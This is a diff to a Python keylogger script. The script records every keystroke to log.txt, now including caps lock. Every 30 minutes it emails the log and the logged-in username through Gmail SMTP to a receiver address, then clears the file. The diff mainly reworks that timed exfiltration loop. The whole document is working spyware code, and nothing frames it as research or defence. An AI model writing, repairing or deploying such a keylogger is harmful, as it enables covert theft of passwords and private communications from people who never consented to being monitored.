@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 import time, smtplib, getpass, threading
 
 from datetime import datetime # Display the date the log is made.
@@ -9,8 +11,9 @@ from email.mime.application import MIMEApplication # For File Attachment
 
 # Email information.
 
-EMAILID = "EMAIL" # REPLACE
-EMAILPASS = "PASS" # REPLACE
+EMAILID = "EMAIL" # REPLACE:
+EMAILPASS = "PASSWORD" # REPLACE
+
 TOEMAIL = "RECEIVER" # REPLACE
 INTERVALS = 30 # NUMBER OF MINUTES.
 SECPERMIN = 60
@@ -21,7 +24,7 @@ FILENAME = "log.txt" # Filename.
 #finished = False # Global Track to see if Log is finished.
 
 # Dictionary stores all non-alphanumeric keys.
-ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] '}
+ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] ', Key.caps_lock: ' [caps] '}
 
 # Key Press.
 def on_press(key):
@@ -45,40 +48,38 @@ def on_release(key):
 
 def IntervalEmailandCls():
 
-    StartTime = time.time() # Start Timer at when thread starts.
-
-    #
     while True:
-        ElapsedTime = time.time() - StartTime # Elapsed Time is computed in Seconds.
-        if (ElapsedTime == CYCLE): # If interval time has passed.
-            try:
-                server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
-    
-                server.starttls() # secure connection.  --> encrypts all info beyond this point.
-                
-                server.login(EMAILID, EMAILPASS) # Logins to account.
-                # EMAIL OBJECT
-                email = MIMEMultipart()
-                email['From'] = EMAILID
-                email['To'] = TOEMAIL
-                email['Subject'] = "Log from {0}".format(str(datetime.now()))
 
-                # TEXT FILE
-                logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
-                logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
-                email.attach(logFile) # Attach the file to the email.
+        time.sleep(CYCLE) # Pause for cycle time before sending email, will act as a clock.
 
-                email.attach(MIMEText('Contains the all key logs from user {0} on {1}'.format(getpass.getuser(),str(datetime.now().replace(microsecond=0))))) # Retrieves UserID from env var of system.
+        server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
 
-                server.sendmail(EMAILID, TOEMAIL, email.as_string()) # Sends it as a string form.
+        server.starttls()  # secure connection.  --> encrypts all info beyond this point.
 
-            except Exception as E:
+        try:
+
+            server.login(EMAILID, EMAILPASS) # Logins to account.
+            # EMAIL OBJECT
+            email = MIMEMultipart()
+            email['From'] = EMAILID
+            email['To'] = TOEMAIL
+            email['Subject'] = "Log from {0}".format(str(datetime.now()))
+
+            # TEXT FILE
+            logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
+            logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
+            email.attach(logFile) # Attach the file to the email.
+
+            email.attach(MIMEText('Contains the all key logs from user {0} on {1}'.format(getpass.getuser(),str(datetime.now().replace(microsecond=0))))) # Retrieves UserID from env var of system.
+
+            server.sendmail(EMAILID, TOEMAIL, email.as_string()) # Sends it as a string form.
+
+        except Exception as E:
                 print(str(E)) # Error detected i.e. Login failed.
-            finally:
-                server.quit() # Close the connection.
+        finally:
+            server.quit() # Close the connection.
 
-            clean_file(FILENAME)
-            StartTime = time.time() # Reset Start Time.
+        clean_file(FILENAME)
 
 # Clears the file.
 def clean_file(file):
@@ -96,8 +97,6 @@ def recreate_file(file):
 
 # Function to retrieve Key presses.
 def StartLog():
-
-    #global finished # Finish to stop scheduled cleaning and sending of file.
 
     # Create a new file to write to.
     recreate_file(FILENAME)
@@ -118,7 +117,7 @@ def main():
         Timer.start() # Thread to time intervals to email and clear the file.
 
         # Shows all active threads.
-        print(threading.enumerate())
+        print(str(threading.enumerate()) + "\n")
 
         # Prevent main thread from finishing.
         KeyLogger.join()
